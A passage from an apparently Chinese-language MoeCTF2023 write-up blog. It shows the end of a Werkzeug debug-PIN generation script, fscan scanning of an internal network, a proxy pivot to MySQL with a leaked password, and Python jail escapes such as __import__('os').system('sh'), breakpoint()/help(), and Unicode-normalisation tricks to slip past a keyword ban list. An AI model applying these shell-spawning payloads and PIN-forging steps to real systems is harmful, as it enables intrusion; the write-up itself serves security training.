            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> value<span class="token punctuation">:</span>
            linux <span class="token operator">+=</span> value
            <span class="token keyword">break</span>

    <span class="token comment"># Containers share the same machine id, add some cgroup</span>
    <span class="token comment"># information. This is used outside containers too but should be</span>
    <span class="token comment"># relatively stable across boots.</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    linux <span class="token operator">=</span> linux<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        uuid1<span class="token punctuation">,</span>
        linux<span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

    num <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    rv<span class="token operator">=</span><span class="token boolean">None</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进入tools文件夹，获取主机ip地址<code>172.21.0.3</code>和<code>172.20.0.4</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> tools
<span class="token function">hostname</span> <span class="token parameter variable">-i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后用fscan扫描内网（好像下面那个ip才是内网）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.21</span>.0.0/16
./fscan <span class="token parameter variable">-h</span> <span class="token number">172.20</span>.0.0/16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013125143933.png" alt="image-20231013125143933"></p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013125852572.png" alt="image-20231013125852572"></p>
<p>排除网关地址，将得到的端口号从小到大排序并以 - 分割：<code>22-3306-6379-8080</code>，即我们下载的hint.zip的解压密码</p>
<p>解压</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解<span class="token code-snippet code keyword">`nps`</span>和<span class="token code-snippet code keyword">`frp`</span>，同样在/app/tools已内置了相应文件
连接代理，推荐<span class="token code-snippet code keyword">`proxychains`</span>
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面我们已经在dataSql.py中拿到了mysql数据库的密码<code>The_P0sswOrD_Y0u_Nev3r_Kn0w</code></p>
<p>接下来就是搭建代理进行内网渗透了。。。</p>
<p>很好，我还是去买个vps吧，不然都不知道怎么挂代理。。。</p>
<p>总之挂完代理之后直接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-h</span> vps地址 <span class="token parameter variable">-P</span> <span class="token number">6001</span> <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入一下上面得到的密码，然后直接找flag就行了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>redis需要利用未授权访问漏洞进行提权：<a target="_blank" rel="noopener" href="https://blog.csdn.net/FryhRx/article/details/124087653">https://blog.csdn.net/FryhRx/article/details/124087653</a></p>
<hr>
<h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><h2 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有过滤，直接命令执行即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012124819188.png" alt="image-20231012124819188"></p>
<hr>
<h2 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 1"></a>Jail Level 1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>限制长度不能超过12，这样子eval逃逸绕过也用不了</p>
<p>那就<code>breakpoint()</code>进pdb模块</p>
<p>参考：<a href="https://c1oudfl0w0.github.io/blog/2023/06/07/python-jail/#level-2-5">https://c1oudfl0w0.github.io/blog/2023/06/07/python-jail/#level-2-5</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012125235808.png" alt="image-20231012125235808"></p>
<hr>
<h2 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'calc Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>长度限制到6，<code>breakpoint()</code>用不了，那就用<code>help()</code></p>
<p>参考：<a href="https://c1oudfl0w0.github.io/blog/2023/06/07/python-jail/#level-3">https://c1oudfl0w0.github.io/blog/2023/06/07/python-jail/#level-3</a></p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012125636553.png" alt="image-20231012125636553"></p>
<hr>
<h2 id="Jail-Level-3"><a href="#Jail-Level-3" class="headerlink" title="Jail Level 3"></a>Jail Level 3</h2><blockquote>
<p>unicode编码绕过</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
BANLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'breakpoint'</span><span class="token punctuation">]</span>
BANLIST_WORDS <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>WORD<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token keyword">for</span> WORD <span class="token keyword">in</span> BANLIST<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
	exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>BANLIST_WORDS<span class="token punctuation">,</span> user_input_data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted word detected! you are hacker!'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>breakpoint()</code>被ban了，<code>help()</code>也不会长度溢出</p>
<p>那么接下来就要考虑对<code>breakpoint()</code>编码绕过让它识别不到</p>
<p>获取碰撞unicode编码的脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> unicodedata <span class="token keyword">import</span> normalize
<span class="token keyword">from</span> string <span class="token keyword">import</span> ascii_lowercase
<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict

lst <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>ascii_lowercase<span class="token punctuation">)</span>
dic <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> char <span class="token keyword">in</span> lst<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x110000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> normalize<span class="token punctuation">(</span><span class="token string">"NFKC"</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> char<span class="token punctuation">:</span>
            dic<span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012231221722.png" alt="image-20231012231221722"></p>
<p>里面取一个b来执行<code>breakpoint()</code>就行</p>
<hr>
<h2 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h2><p>python版本2.7</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013102920883.png" alt="image-20231013102920883"></p>
<p>没过滤直接打？</p>
<hr>
<h2 id="Jail-Level-5（未完成）"><a href="#Jail-Level-5（未完成）" class="headerlink" title="Jail Level 5（未完成）"></a>Jail Level 5（未完成）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">func_filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
  not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'"'</span>`bid'<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
user_input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> func_filter<span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! Bye~"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> user_input_data<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Sorry we only ascii for this chall!"</span><span class="token punctuation">)</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>user_input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ban了<code>&quot;</code>，<code>&#39;</code>，反引号，<code>b</code>，<code>i</code>，<code>d</code></p>
<hr>
<h2 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h2><blockquote>
<p>globals()环境变量泄露</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_key_into_local_but_valid_key_into_remote <span class="token operator">=</span> <span class="token string">"moectfisbestctfhopeyoulikethat"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Guys,Welcome to the moeleak challenge.Have fun!."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>"<span class="token operator">|</span> Options<span class="token punctuation">:</span>
<span class="token operator">|</span>   <span class="token punctuation">[</span>V<span class="token punctuation">]</span>uln
<span class="token operator">|</span>   <span class="token punctuation">[</span>B<span class="token punctuation">]</span>ackdoor"<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">func_filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
  	not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'vvvveeee'</span><span class="token punctuation">)</span>
  	<span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  	challenge_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
  	<span class="token keyword">if</span> challenge_choice <span class="token operator">==</span> <span class="token string">'v'</span><span class="token punctuation">:</span>
code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code >> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>
  	exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> func_filter<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
  	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! byte~"</span><span class="token punctuation">)</span>
  	exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
  	<span class="token keyword">elif</span> challenge_choice <span class="token operator">==</span> <span class="token string">'b'</span><span class="token punctuation">:</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>
key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"key >> "</span><span class="token punctuation">)</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_into_local_but_valid_key_into_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
  	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Admin,please input your code:"</span><span class="token punctuation">)</span>
  	code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"backdoor >> "</span><span class="token punctuation">)</span>
  	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
  	<span class="token keyword">else</span><span class="token punctuation">:</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You should select valid choice!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Vuln中限制长度9，Backdoor无限制但是要key</p>
<p>我们先进Vuln，用<code>globals()</code>查看环境变量</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013104636655.png" alt="image-20231013104636655"></p>
<p>可以发现key的值</p>
<p>然后带上key去backdoor命令执行即可</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013104818399.png" alt="image-20231013104818399"></p>
<hr>
<h2 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">    fake_key_into_local_but_valid_key_into_remote <span class="token operator">=</span> <span class="token string">"moectfisbestctfhopeyoulikethat"</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Guys,Welcome to the moeleak challenge.Have fun!."</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">func_filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
      not_allowed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'moe_dbt'</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> not_allowed <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>"<span class="token operator">|</span> Options<span class="token punctuation">:</span>
<span class="token operator">|</span>       <span class="token punctuation">[</span>V<span class="token punctuation">]</span>uln
<span class="token operator">|</span>       <span class="token punctuation">[</span>B<span class="token punctuation">]</span>ackdoor"<span class="token punctuation">)</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      challenge_choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> challenge_choice <span class="token operator">==</span> <span class="token string">'v'</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code >> "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you're hacker!"</span><span class="token punctuation">)</span>
          exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> func_filter<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker! byte~"</span><span class="token punctuation">)</span>
          exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
